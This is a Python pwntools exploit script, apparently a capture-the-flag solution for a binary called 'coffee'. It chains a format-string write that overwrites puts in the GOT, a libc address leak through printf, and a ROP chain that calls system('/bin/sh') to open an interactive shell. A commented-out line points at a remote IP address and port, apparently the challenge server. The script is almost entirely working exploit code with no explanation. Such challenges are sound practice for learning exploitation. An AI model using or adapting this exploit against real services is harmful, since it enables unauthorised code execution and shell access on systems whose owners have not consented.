from pwn import *

r = process("./coffee")
gdb.attach(r)

#r = remote("34.146.101.4", 30002)


puts_got = 0x404018
printf_got = 0x404028

pop3_ret = 4750
pop_rdi_ret = 0x0000000000401293
printf = 0x401090
puts_real = 0x401030
pop_rsi_r15_ret = 0x0000000000401291
scanf = 0x4010a0
pop4_ret = 0x000000000040128c
puts = 0x401070
scanf_arg = 0x402004
ret = 0x000000000040101a
main = 0x401196

main70 = 0x11dc

payload = b'%4748x' + b'%8$hn'
payload += b'a'*(16-len(payload))  
payload += p64(puts_got) # 10

payload += p64(pop_rdi_ret) + p64(printf_got) + p64(puts_real)
payload += p64(main)

r.sendline(payload)

printf_off = 0x0000000000064e10

stuff = r.recvuntil(b'\x7f')[-6:]

libc_base = int.from_bytes(stuff, 'little') - printf_off

print(hex(libc_base))

system = libc_base + 0x0000000000055410
binsh = libc_base + 0x1b75aa

payload = b'%64x' + b'%13$n'
payload += b'%4684x' + b'%12$hn'
payload += b'a'*(24-len(payload))
payload += p64(pop_rdi_ret) + p64(binsh)
payload += p64(system)
payload += p64(puts_got)
payload += p64(puts_got + 2)

r.sendline(payload)



r.interactive()